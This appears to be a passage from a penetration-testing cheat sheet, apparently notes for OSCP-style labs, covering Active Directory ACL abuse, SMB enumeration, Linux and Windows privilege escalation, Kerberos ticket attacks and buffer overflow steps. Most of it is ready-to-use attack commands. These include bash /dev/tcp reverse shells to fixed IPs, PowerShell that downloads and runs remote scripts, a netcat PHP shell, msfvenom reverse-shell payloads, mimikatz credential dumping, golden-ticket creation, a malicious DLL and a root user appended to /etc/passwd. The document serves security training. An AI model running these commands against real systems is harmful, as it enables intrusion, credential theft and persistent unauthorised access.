Add-DomainObjectAcl -TargetIdentity $TargetUser -PrincipalIdentity $CompromisedUser -Rights all
```

```
set-adaccountpassword -identity $TargetUser -reset -newpassword $Password
```

Or

```
Set-DomainUserPassword -Identity $TargetUser -accountpassword $Password
```

\*Uncover Secure String Passwords

If credentials are in an xml

```
$cred = Import-Clixml -Path .\credentials.xml
```

```
[System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($cred))
```

```
$cred.GetNetworkCredential().password
```

Using only the password string

```
$pass = '01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748111' | convertto-securestring
```

```
$user = 'domain\user'
```

```
$cred = New-Object System.Management.Automation.PSCredential $user,$pass
```

```
$cred.getnetworkcredential() | fl
```

### Samba/SMB

_When testing with smb try with null sessions, anonymous, and valid credentials_

* run enum4linux to possibly find users, shares, files
* use "smbclient" to manually view the shares/files:
  * look for "GPP" Groups.xml -- may contain a "cpassword" and username
    * use `gpp-decrypt cpassword` to decrypt
  * look for lsass.zip or lsass.DMP -- may contain encrypted password, Kerberos tickets, NT hash, LM hash, DPAPI keys,and Smartcard PIN
    * use `pypykatz lsa minidump lsass.DMP`
* can you read or upload files?
* Can you upload a file with a shell? Is there a service/cronjob that can execute your uploaded file?
* smbget -R "smb://user:pass@IP/Share" -- recusivley get files replace user and pass with a space for null sessions
* smbclient //IP/share
* smbclient -N //IP/share -c ls | awk '{ print $1 }' -- this will get the names of the directories of the first column for potential users
* ms09\_050\_smb2\_negotiate\_func\_index Exploit (Windows Only)

_try all three if needed smbexec,psexec,wmiexec_ (if you cannot upload ry tools anyway, you may get a shell)

* psexec.py example.com/username@ip -- may or may not need credentials
* psexec.py ./administrator@IP -hashes :NTHASH
* smbexec.py user:password@IP
* wmiexec
* smbmap -u user -p pass -H IP -- smbmap work better than smbclient
* smbmap -u SABatchJobs -p SABatchJobs -H megabank.local -A '.\*' -R download everything
* use allinfo file if download is 0 bytes it may be 'Alternate Data Streams (ADS)'
* cme smb 10.10.10.161 -u '' -p '' -- checks for null sessions and this is different from anonymous loging
* cme smb 10.10.10.161 -u 'anonymous' -p ''
* cme smb 10.10.10.161 --pass-pol
* cme smb 10.10.10.161 --users
* cme smb 10.10.10.161 --groups
* cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sessions
* cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares
* cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --loggedon-users
* cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --users
* cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --rid-brute
* cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' s --local-group
* cme smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt

### NFS

showmount -e -- Check shares

### MySQL

use hydra with `rockyou.txt` and with `root` as the user for a less complicated password attack

### RDP

Password attacks using Crowbar

```
crowbar -b rdp -s 10.11.1.0/24 -U ../usernames.txt -C ../passwords.txt -n 1 -d
```

## Linux Privilege Escalation

* [Linux Privilege Escalation Techniques](https://www.linkedin.com/pulse/linux-privilege-escalation-techniques-zakwan-abid/?trackingId=yCGYGnnzQ2WigibM4Wip5A%3D%3D)
* [Restricted Shells](https://0xffsec.com/handbook/shells/restricted-shells/)
  * echo os.system("/bin/bash")
* [Docker Breakout Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation)
* [S1REN Priv esc](https://sirensecurity.io/blog/linux-privilege-escalation-resources/)
* check config.php for password reuse grep -rpci 'pass'
* root password as root
* run `sudo -l` to see what you can run with sudo
* ./linpeas.sh -q -e -a

### Exploit network file sharing

configuration is kept in the /etc/exports file. privilege escalation vector is the “no\_root\_squash”. If the “no\_root\_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

* cat /etc/exports - list shares on victim machine
* mkdir /tmp/victimnfs - create tmp directory on attacker machine
* mount -o rw victimIP:/home/backup /tmp/victimnfs - mount the victim network file share that has 'no\_root\_squash'
* create shell with suid bits

```
int main()
{
  setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

* gcc rootz.c -o rootz -w
* chmod +s rootz
* going back to victim machine execute the suid bit shell to gain root

### Exploit Path Variable Manipulation

```
1. echo '/bin/sh' > file
2. chmod 777 file
3. export PATH=/tmp:$PATH
```

* check /opt/ /var/opt
* `TCP-LISTEN:internet-facing-port,fork TCP:internal-ip:port &` -- port redirection
* look for users in /etc/passwd
  * use usernames as passwords for bruteforcing ssh
* if /etc/passwd is writeable add user with password > `echo 'thescriptkid:$6$CuxbQ7PO4S7csJM9$TIx0cYXhT./kZfOHgXd44OHecKCqClA2QH.r9lo4Q..nZ73OWLRFSdu4o2Qfotn4DHpJpSc.b.w0Cjto1qqjz.:0:0:comment:/root:/bin/bash' >> /etc/passwd` -- thescriptkid:thescriptkid

### Exploit +ep permission software

use `getcap -r / 2> /dev/null` to find said software

* /usr/bin/python2.7 = cap\_setuid+ep
  * python -c 'import os; os.setuid(0); os.system("/bin/sh")'
* vim - use py or py3 for python2 or python3
  * ./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
* view
  * /view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

### Check root and user cronjobs

* /etc/cron.d/
* crontab -l
* cat /etc/crontab

### Search for all SUID files `find / -perm /4000 2> /dev/null` and use https://gtfobins.github.io/

* nmap
  1. nmap --interactive
  2. !/bin/bash -p
*   hping3 -p

    run bash shell
*   zsh -p

    run bash shell
* gdb
  * gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
* base32 - can potentially read any file including root ssh keys
  * LFILE=/file/to/read && base32 "$LFILE" | base32 --decode
* base64 - can potentially read any file including root ssh keys
  * LFILE=file\_to\_read
  * base64 "$LFILE" | base64 --decode
* /bin/bash -p
* cputlimit
  * cpulimit -l 100 -f cp /bin/bash .
  * cpulimit -l 100 -f chmod +s ./bash
  * ./bash -p
* php
  * php -r "pcntl\_exec('/bin/sh', \['-p']);"
* vim
  * vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
* systemctl

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/bash -i >& /dev/tcp/10.6.3.75/9001 0>&1"
[Install]
WantedBy=multi-user.target' > $TF
```

### Exploit sudo

* sudo nice /bin/sh
  * if sudoers file is restricting the nice command to `nice /directory/*` then attempt `sudo nice /directory/../bin/sh`
* sudo time /bin/sh
* sudo mysql system /bin/bash
* sudo su -
* sudo systemctl restart apache2
* sudo nmap
  * TF=$(mktemp)
  * echo 'os.execute("/bin/sh")' > $TF
  * sudo -u root nmap --script=$TF
* man pages
  * sudo man man
  * !/bin/sh
* sudo yum

```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

* sudo nano
  * reset; sh 1>&0 2>&0
* check for kernel version maybe theres a exploit to run. use google for online exploit -- https://www.linuxkernelcves.com/
* look for any readable .mysql\_history files as they may contain strings that appear to be passwords
* look for world writeable /etc/apache2/apache2.conf you can potentially replace the `User` and `Group` to `root` or another `user` NOTE: restart apache2 service required and an uploaded php reverse shell
  * `sed -i 's/User ${APACHE_RUN_USER}/User userORroot/g' apache2.conf`
  * `sed -i 's/Group ${APACHE_RUN_GROUP}/Group userORroot/g' apache2.conf`
* exploit C scripts
  * if a script is using whoami and strncmp to compare a logged in username to a string to give rootshell, take advantage of the PATH variable and create a whoami script to print out the username. `PATH=/tmp/whoami:`
* dirty cow exploit https://www.exploit-db.com/exploits/40616 works versions below 4.4.2 - can be compiled in your kali machine

## Windows Priv Esc

_BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment._

_Nodes represent principals and other objects in Active Directory._

[BloodHound Nodes](https://bloodhound.readthedocs.io/en/latest/data-analysis/nodes.html)

_Edges are part of the graph construct, and are represented as links that connect one node to another._

[BloodHound Edges](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)

_See All shortestPaths and Shortest Paths. Add **LIMIT number** to limit the output_

`MATCH p=allShortestPaths((n)-[*1..]->(m)) WHERE m.domain="DOMAIN.LOCAL" AND m<>n RETURN p` `MATCH p=ShortestPath((n)-[*1..]->(m)) WHERE m.domain="DOMAIN.LOCAL" AND m<>n RETURN p`

_Tactics represent the "why" of an ATT\&CK technique or sub-technique. It is the adversary's tactical goal: the reason for performing an action. For example, an adversary may want to achieve credential access._

https://attack.mitre.org/tactics/enterprise/

_Techniques represent 'how' an adversary achieves a tactical goal by performing an action. For example, an adversary may dump credentials to achieve credential access._

https://attack.mitre.org/techniques/enterprise/

_An interactive cheat sheet, containing a curated list of offensive security tools and their respective commands, to be used against Windows/AD environments. If you hate constantly looking up the right command to use against a Windows or Active Directory environment (like me), this project should help ease the pain a bit._

https://wadcoms.github.io/

_Living Off The Land Techniques. Abusing Dual-Use Tools in windows_

https://lolbas-project.github.io/

_Windows PrivEsc Resources_

https://sirensecurity.io/blog/windows-privilege-escalation-resources/

```
import-module .\adPEAS.ps1; Invoke-adPEAS

import-module .\Sherlock.ps1; Find-AllVulns

import-module .\PowerUp.ps1; Invoke-AllChecks -Format List

import-module .\winPEAS.ps1; Invoke-WinPEAS
```

bypassuac-x64.exe -- or x32

### Windows commands to run

* Can you replace the binary with a reverse shell? i.e. if it’s currently running, rename it, upload a reverse shell with the original binary name, start an nc listener, then type shutdown -r to reboot the box and restart the service.
* dir -force
* sc queryex type=service
* driverquery
* schtasks /query /fo LIST /v
* systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
* qwinsta - Other users logged in simultaneously
* whoami /all
* net user
* net user /domain
* net user 'user'
* net user 'user' /domain
* wmic useraccount
* net group "Domain Computers" /domain
* net group "Domain Controllers" /domain
* net localgroup
* net group /domain
* net group 'groupname'
* net group 'groupname' /domain
* wmic group
* wmic ntdomain
* ipconfig /all
* netstat -ano
* icalcs file -- file and folder permissions
* route print
* arp -a
* wmic logicaldisk get caption,description,providername

_Enumerate Firewall_

* sc query windefend
* netsh advfirewall firewall dump
* netsh firewall show state
* netsh firewall show config

_Password Hunting_

findstr /si password \*.txt \*.ini \*.config \*.php findstr /si pass \*.txt \*.ini \*.config \*.php findstr /si password= \*.txt \*.ini \*.config \*.php \*.pl \*.xml findstr /si password \*.txt \*.ini \*.config \*.php \*.pl \*.xml \*.xls \*.xlsx \*.csv \*.doc \*.docx findstr /si pass \*.txt \*.ini \*.config \*.php \*.pl \*.xml \*.xls \*.xlsx \*.csv \*.doc \*.docx

_Vulnerable Software_

* wmic qfe get Caption,Description,HotFixID,InstalledOn
* wmic product get name,version,vendor
* wmic service list brief | findstr "Running" - for more info on the listed services; use sc qc servicename

_Offensive Powershell_

https://gitbook.brainyou.stream/powershell/offensive-powershell

https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70

### Powershell commands to run

* Find files `Get-ChildItem -Path C:/ -Recurse -Hidden -ErrorAction SilentlyContinue -Include *example.txt*`
* users `Get-LocalUser`
* Users with no password required `Get-LocalUser | Where-Object -Property PasswordRequired -Match false`
* Groups `Get-LocalGroup`
* Hotfixes `Get-Hotfix`
* scheduled tasks `Get-ScheduledTask`
* get access control lists `get-acl directory`
* `setspn -T domain -Q */*` -- extract all accounts in the SPN. enter domain without tld
* list running services `Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`
* Get-Service | Where-Object {$\_.Status -eq "Running"} -- look for unusual services or exploitable
  * windowscheduler
  * check `C:\Program Files (x86)\SystemScheduler\Events` log files. for any running events. this is similar to linux cronjobs.

### PowerView Commands

Load PowerView.ps1 in memory

```
IEX (New-Object Net.Webclient).downloadstring("http://AttackingIP/PowerView.ps1")
```

Enumerate All but the most interesting group using

```
get-ngroup
```

```
get-objectacl -SamAccountName "Interesting Group" -ResolveGUIDs
```

Depending on the user or group found in "IdentityReference" from the output `get-objectacl -SamAccountName "Interesting Group" -ResolveGUIDs` run.

```
Get-ObjectAcl -SamAccountName "IdentityReference" -ResolveGUIDs
```

```
Invoke-ACLScanner | select objectdn,activedirectoryrights,identityreference | fl
```

Look for Passwords in User Descriptions

```
find-userfield -SearchField description "password"
find-userfield -SearchField description "pass"
```

Get SPNs

```
Get-NetComputer | select -expandproperty serviceprincipalname
```

```
get-domainuser -spn | select serviceprincipalname
```

Request Service Ticket

```
Add-Type -AssemblyName System.IdentityModel
```

```
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SomeSPN"
```

* powershell -exec bypass "iex (New-Object Net.WebClient).DownloadString('http://192.168.119.241:8080/powerview.ps1');Get-NetLoggedon -ComputerName DC01"
* Get-DomainGroup -MemberIdentity SomeUser | select samaccountname
* Get-NetComputer | select operatingsystem - gets a list of all operating systems on the domain
* Get-NetUser | select cn - gets a list of all users on the domain
* Get-ADPrincipalGroupMembership "username" | select name
* Get-SmbShare -- lists shares
* Get-NetComputer | select operatingsystem -- show other windows machines OS's
* get-netloggedon -computername name -- can get from systeminfo
* get-netsession -computername name -- can get over the network
* Get-NetDomain
* Get-NetDomainController
* Get-DomainPolicy
* (Get-DomainPolicy)."system access"
* Get-NetUser | select eg select cn, description
* Get-userProperty -Properties pwdlastset

Don't attack accounts with low logoncount because they might be honeypot account. As soon as you compromise it, the security team will be alerted of your presence

```
Get -UserProperty -Properties logoncount
```

* If a group has `WriteDacl` privileges on the Domain. The WriteDACL privilege gives a user the ability to add ACLs to an object. This means that we can add a user to this group and give them `DCSync` privileges.
  1. `net user thescriptkid thescriptkid /add /domain`
  2. `net group groupname thescriptkid /add` -- you may or not need to add the user to another group
  3. `$pass = convertto-securestring 'thescriptkid' -asplain -force`
  4. `$cred = new-object system.management.automation.pscredential('htb\thescriptkid', $pass)`
  5. `Add-ObjectACL -PrincipalIdentity thescriptkid -Credential $cred -Rights DCSync`
  6. Use secretsdump.py to dump hashes and pass the hash or crack
* If `AppLocker` is configured with default AppLocker rules, we can bypass it by placing our executable in the following directory: `C:\Windows\System32\spool\drivers\color` - This is whitelisted by default.
* get history commands `cat ~/appdata/roaming/microsoft/windows/powershell/psreadline/consolehost_history.txt`
* `Invoke-Kerberoast.ps1` - upload from kali and run `Invoke-Kerberoast -OutputFormat hashcat | fl`
* `Invoke-Mimikatz -command '"base64 /output:true" "kerberos::list /export"'` - export tickets to base64
* `kirbi2john file.kirbi hash.txt` - convert .kirbi tickets to crackable hash format
* https://github.com/GhostPack/Rubeus
  * Rubeus.exe harvest /interval:30 -- This command tells Rubeus to harvest for TGTs(tickets) every 30 seconds
  * Rubeus.exe brute /password:Password1 /noticket -- bruteforcing. you must add the domain controller domain name to windows hosts before using rubeus.exe `echo 127.0.0.1 example.com >> C:\Windows\System32\drivers\etc\hosts`
  * Rubeus.exe kerberoast -- kerberosting. This will dump the Kerberos hash of any kerberoastable users. use hashcat -m 13100 -a 0 hash wordlist for hash type `$krb5tgs$23`
  * Rubeus.exe asreproast -- AS-Rep roasting. Dumping KRBASREP5 Hashes. Be sure to Insert `23$` after `$krb5asrep$` so that the first line will be `$krb5asrep$23`. use hashcat -m 18200 for hash type `$krb5asrep$23$`
  * mimikatz.exe -- this will enter a mimikatz interactive cli
    * `privilege::debug` -- this will show `Privilege '20' OK` if you have admin privileges. mimikatz will not run properly if you do not have admin rights.
    * `sekurlsa::tickets /export` -- this will export all of the .kirbi tickets into the directory that you are currently in. this will also show the base 64 encoded tickets.
      * you wanting to impersonate a ticket. look for an administrator ticket from krbtgt. example `mimikatz # kerberos::ptt [0;3d27e]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi` this will cache and impersonate the ticket
    * `lsadump::lsa /inject /name:krbtgt` -- Dump the krbtgt Hashes. This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
    * `lsadump::lsa /patch` -- dump hashes
    * `kerberos::golden /user:administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 <--primary ntlm hash /id:500` -- This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
    * `misc::cmd` -- this will open a new elevated command prompt with the given ticket in mimikatz
    * `misc::skeleton` -- Installing Kerberos Backdoors.
  * `klist` to verify the impersonated ticket as this will list cached tickets. having impersonated tickets can give you access to sensitive data or server
  * one liner mimikatz `C:\windows\system32\spool\drivers\color\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords /all" "lsadump::sam" "sekurlsa::tickets" "exit"`
  * automate Misconfiguration Checks with `PowerUp.ps1`
    * using meterpreter shell
      1. `meterpreter > upload /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1`
      2. `meterpreter > load powershell`
      3. `meterpreter > powershell_shell`
      4. `PS > . .\PowerUp.ps1`
      5. `PS > Invoke-AllChecks`

### DNSadmins to system -- user must be apart of the dnsadmins group

* create dll `msfvenom -p windows/x64/exec cmd='net user administrator Password! /domain' -f dll > da.dll`
* create smbshare to evade WindowsDefenderr `sudo smbserver.py share ./`
* retrieve and set the remote path to the dll into windows reg `cmd /c dnscmd localhost /config /serverlevelplugindll \\IP\share\da.dll` smb server must be running
* restart dns on windows machine
  1. sc.exe stop dns
  2. sc.exe start dns
  3. Scheduled Tasks
     * schtasks -- you may see a scheduled task that either lost its binary or using a binary you can modify.
  4. Saved credentials -- `cmdkey /list` will saved credentials
     * If you see any credentials worth trying, you can use them with the runas command and the /savecred option, as seen below. `runas /savecred /user:admin reverse_shell.exe`
  5. Registry keys -- Registry keys potentially containing passwords can be queried using the commands below.
  6. `reg query HKLM /f password /t REG_SZ /s`
  7. `reg query HKCU /f password /t REG_SZ /s`
  8. Unattend files -- potential users passwords are stored in base64. `C:\Windows\Panther\Unattend\Unattended.xml`
  9. AlwaysInstallElevated -- to work requirements must be enabled.
     1. reg query HKEY\_CURRENT\_USER\Software\Policies\Microsoft\Windows\Installer -- must be on
     2. reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer -- must be on
     3. msfvenom -p windows/x64/shell\_reverse\_tcpLHOST=ATTACKING\_10.10.10.223 LPORT=LOCAL\_PORT -f msi -o malicious.msi -- generate msi
     4. create listener on attacking machine
     5. msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi -- install

### DLL Hijacking

* to find potential DLL hijacking vulnerabilities is Process Monitor (ProcMon). As ProcMon will require administrative privileges to work, this is not a vulnerability you can uncover on the target system.
* look for NAME NOT FOUND; this means that its trying to call the dll but cannot find it, thus allowing the attacker to create a malicious dll and place it in the path where its trying to call it.
* to create a malicious dll save as c. mingw compiler can be used to generate the DLL. `x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll`. transfer the file to the windows machine.
* `apt install gcc-mingw-w64-x86-64` to install on linux

```
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net user user Newpassword11");
        ExitProcess(0);
    }
    return TRUE;
}
```

* restart the dllsvc service `sc stop dllsvc & sc start dllsvc`

### unquoated service paths vulnerability

* `wmic service get name,displayname,pathname,startmode` - this will list services running or `sc query state= all`
* `sc qc unquotedsvc` - this will further check the binary path of this service
* `.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"` -- this will check our privileges on folders inthe path. the goal is to find a folder that is writable.
* `sc start unquotedsvc` - to start the service use cmd
* if `CanRestart` is `True` -- create malicous reverse shell executable with msfvenom and replace the service executable with the malicous one.

### enumerating server manager (remote desktop)

* Navigate to the tools tab and select the Active Directory Users and Computers -- This will pull up a list of all users on the domain as well as some other useful tabs to use such as groups and computers

### Token Impersonation

`whoami /all` look for privileges to abuse. most commonly abused privileges https://steflan-security.com/linux-privilege-escalation-token-impersonation/

https://jlajara.gitlab.io/Potatoes\_Windows\_Privesc

* SeImpersonatePrivilege OR SeAssignPrimaryToken
  1. `load incognito` in meterpreter
  2. `list_tokens -g` -- this will show tokens available for impersonation
  3. `Invoke-TokenManipulation.ps1` -- powershell version to sho tokens available for impersation
     1. `import-module .\Invoke-TokenManipulation.ps1`
     2. `.\Invoke-TokenManipulation -Enumerate`
     3. `.\Invoke-TokenManipulation -ImpersonateUser -Username "something\administrator"`
     4. `.\Invoke-TokenManipulation -ImpersonateUser -Username "nt authority\system"`
  4. `impersonate_token "BUILTIN\Administrators` -- use this command Note: "BUILTIN\Administrators" is an example token
  5. For Windows Server 2016 and Windows Server 2019
     1. upload printspoofer.exe to target
     2. PrintSpoofer.exe -i -c cmd
  6. `migrate PID` to services.exe to ensure yourself with correct permissions
  7. `JuicyPotato.exe` -- download to target.
     1. download Invoke-PowerShellTcp.ps1 to target and add `Invoke-PowerShellTcp -Reverse -IPAddress listeneraddress -Port portnumber` to the end of the file
     2. create execute.bat with contents `PowerShell "IEX(New-Object Net.WebClient).downloadString('http://listeneraddress/Invoke-PowerShellTcp.ps1')"` and download to target
     3. run .\JuicyPotato.exe -t \* -p execute.bat -l portnumber
     4. setup nc listener with portnumber
* SeAssignPrimaryPrivilege
* SeTcbPrivilege
* SeBackupPrivilege
  1. `diskshadow /s cmd`
* SeRestorePrivilege
* SeCreateTokenPrivilege
* SeLoadDriverPrivilege
* SeTakeOwnershipPrivilege
* SeDebugPrivilege
* Is Mozilla Firefox installed? if so dump credentials. you will need to transfer these to your attacker machine and use python script to decrypt.
  * `C:\Users\alice\APPDATA\Roaming\Mozilla\Firefox\Profiles\` example path to a users credentials
  * https://github.com/unode/firefox\_decrypt
* `Invoke-RunasCS -Username USERNAME -Password PASSWORD -Command "whoami"` -- found credentials? upload and run script.
* Enable rdp and allow through firewall
  1. `reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
  2. `netsh advfirewall firewall set rule group="administrators" new enable=Yes`
  3. for older systems `netsh firewall set service type = remotedesktop mode = enable`

### Random Software

_Custom or commercial code, operating system utilities, open-source software, or other tools used to conduct behavior modeled in ATT\&CK._

https://attack.mitre.org/software/

## Windows Buffer OverFlow

### Mona Setup

Set the Mona Configuration `!mona config -set workingfolder c:\mona\%p`

### Fuzzing

Try later https://github.com/AceSineX/BOF-fuzzer-python-3-All-in

Run a fuzzer and it will send increasingly long strings comprised of As. If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. Make a note of the largest number of bytes that were sent.

Create another py file.

### Generating a Cyclic Pattern

Run `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l length` to generate a cyclic pattern of a length 400 bytes longer than the string that crashed the server (change the -l value to this)

Copy the output and place it into a payload variable of the exploit script. On Windows, in Immunity Debugger, restart the vulnerable app and run the exploit.

### Finding MSP Distance

On Immunity debugger run `!mona findmsp -distance length`. the length is the current payload length.

### Controlling EIP

Mona should display a log window with the output of the command. If not, click the "Window" menu and then "Log data" to view it (choose "CPU" to switch back to the standard view). In this output you should see a line which states: `EIP contains normal pattern : ... (offset XXXX)`. Update your exploit script and set the `OFFSET` variable to this value.

Set the payload variable to an empty string again and set the retn variable to "BBBB". restart vulnerable app and rereun exploit. `EIP` register should now be overwritten with the 4 B's (e.g. 42424242).

### Finding Bad Characters

Generate a bytearray using mona, and exclude the null byte (\x00) by default. `!mona bytearray -b "\x00"`

Generate a string of bad chars from \x01 to \xff and update your exploit's payload variable with the bytearray.

```
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

Restart the vulnerable app in Immunity and run the modified exploit script. Make a note of the address to which the `ESP` register points and use it in the following mona command `!mona compare -f C:\mona\oscp\bytearray.bin -a <address>`

The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file. Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string. The first badchar in the list should be the null byte (\x00) since we already removed it from the file. Make a note of any others. Generate a new bytearray in mona, specifying these new badchars along with \x00. Then update the payload variable in your exploit.py script and remove the new badchars as well. Restart oscp.exe in Immunity and run the modified exploit.py script again. Repeat the badchar comparison until the results status returns `"Unmodified"`. This indicates that no more badchars exist.

### Finding JMP ESP

`!mona jmp -r esp -cpb "\x00"` to Find a Jump Point. This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified. Choose an address and update your exploit script, set the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.

### Generating ShellCode

Run `msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c` to generate payload. use -b option with all the badchars you identified including \x00. update the payload variable with the payload.

### Prepending NOPs

Prepend NOPs. Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes. `padding = "\x90" * 16`

### Win

Restart vulnerable app and exploit

## Useful Commands

### Find any file with the word "filename" in it

```
find / -iname "*filename*" 2>/dev/null
```

### Scramble wordlists with john

```
john --wordlist=wordlist.txt --rules --stdout > scrambledWordlist.txt
```

**Crunch to make wordlists**

```
crunch min max -t @,%^
Specifies a pattern, eg: @@god@@@@ where the only the @'s, ,'s, %'s, and ^'s will change.
@ will insert lower case characters
, will insert upper case characters
% will insert numbers
^ will insert symbols

```

**One of many ways of a spawning Python shell**

```
__import__('os').system("/bin/bash")
```

**Execute netcat revershell using PHP**

```
<?php system('nc -e /bin/bash ip port'); ?>
```

## Tunnels

### Chisel

**Step 1**

Fire up chisel server on kali.

```
chisel server --reverse --port 443
```

**Step 2**

Fire up chisel client on compromised machine.

```
.\chisel.exe client 172.16.0.1:443 R:389:172.16.0.131:389
```

### Sshuttle

You can chain these to go deeper into networks.

```
sshuttle -r root@vitcimIP 10.3.3.0/24
```

### Simple SSH

```
ssh -L kali-port:127.0.0.1:victim-port -fN victimUser@victim-IP**
```

### SSH dynamic port forwarding and proxy chains

**Step 1**

```
sudo ssh -N -D kali-localIP:ProxyChainsPort compromised-user@compromised-boxIP
```

**Step 2**

Set proxychains conf to match ProxyChainsPort (see above) if not done already.

```
vim /etc/proxychains.conf
```

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 8080
```

**Step 3**

```
proxychains autorecon -t hosts.txt --dirbuster.tool dirsearch --no-port-dirs -o ./ --reports markdown -vv --proxychains
```

### Plink

```
cmd.exe /c echo y | plink.exe -ssh -l pentester -pw 'Fmd2!0%0' -R 192.168.119.220:111:127.0.0.1:111 192.168.119.220
```

## Reverse shells

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

### Bash

```
bash -c 'bash -i >& /dev/tcp/192.168.0.23/80 0>&1'
```

### Reverse powershell using kali terminal

```
